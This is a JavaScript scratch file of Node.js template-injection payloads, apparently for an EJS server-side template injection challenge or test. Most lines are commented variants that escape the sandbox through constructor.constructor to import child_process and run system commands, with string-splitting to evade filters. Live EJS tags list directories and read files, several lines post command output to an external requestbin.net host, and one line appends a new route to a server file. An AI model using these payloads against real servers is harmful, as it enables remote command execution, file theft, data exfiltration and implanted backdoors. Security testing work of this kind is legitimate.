// (await import('child_process')).execSync('dir').toString();

// import('child_process').then(d => {
//     process.constructor.constructor(d.execSync('dir').toString())()
// });

// import('child_process').then(async d =>{
//     let a = d.execSync('dir').toString();
//     let c = await import('http');
//     console.log(a);
// })

// (await import('child_process')).execFile('dir').toString();

// ({}).constructor.constructor("return import('child_process').then(d => {({}).__proto__x = d.execSync('dir').toString()})")()

// payload in commonJs
// ({}).constructor.constructor('return process.mainModule.require("child_process").execSync("dir").toString()')()

// payload in module
// ({}).constructor.constructor('return await import("child_process")')()

// Function()
// let c = await (async function() {}).constructor("return (await import('child_process')).execSync('dir').toString() ")()
// await import('child_process').execSync('dir').toString();
// (await import('request')).post({headers: {'content-type':'application/x-www-form-urlencoded'},url:'kv868a1ulmazb8kt.b.requestbin.net',body:'mes=1'})

// let c = '{"mes":"' + (await import('child_process')).execSync('dir').toString() + '"}'
// let d = JSON.stringify({mes:c});
// console.log("{'mes':'" + c + "'}");
// console.log(c);

({}).constructor.constructor(`import('child_proce'+'ss').then(d => {
    let c = d.execSync('dir').toString()).replace(/[\r\n]/g,',');
    console.log(c)
}`
)()

// ({}).constructor.constructor(`import('child_process').then(d => {c=d.execSync('ls').toString()})`)();

// x='child_proce'
// y='ss'

// <%= ([]).constructor.constructor(`import(x+y).then(d => c=d.execSync('ls')`)(); %>

// payload

<%= ([]).constructor.constructor(`import('fs').then(d => c=d.readdirSync('./'))`)(); %>

<%= ([]).constructor.constructor(`import('fs').then(d => e=d.readFileSync('./' + c[2]))`)(); %>

// let c = d.execSync('cat test.txt').toString().replace(/[\r\n]/g,',');
// import('node-fetch').then(({default: fetch}) => fetch('http://localhost:3000/test', {method: 'POST',body: '{"mes":"' + c + '"}',headers: {'Content-Type': 'application/json'}}))


// .post({
//     url:'kv868a1ulmazb8kt.b.requestbin.net',
//     body: {mes:1},
//     json: true
// });

// (async function(){}).constructor(`(await import('request')).post({url:'kv868a1ulmazb8kt.b.requestbin.net',body:{mes:'1'}, json:true})`)()

// console.log(c)





// (new Object()).x;

// console.log(process.mainModule.require("child_process").execSync('dir').toString());

// Object.__proto__.body = {"name": "test"}
// console.log(Object.x)

// console.log(Function('console.log("1")')());

// ({}).__proto__.a = await import('child_process').execFile('dir').toString();
// console.log()
// console.log()


// import('fs').then(d => {
//     d.appendFileSync('./ssti.js','app.get("/test", (req,res) => return res.send(""))')
// })


// let c = (async () => await import('child_process'))()
// console.log(c.finally((d) => d))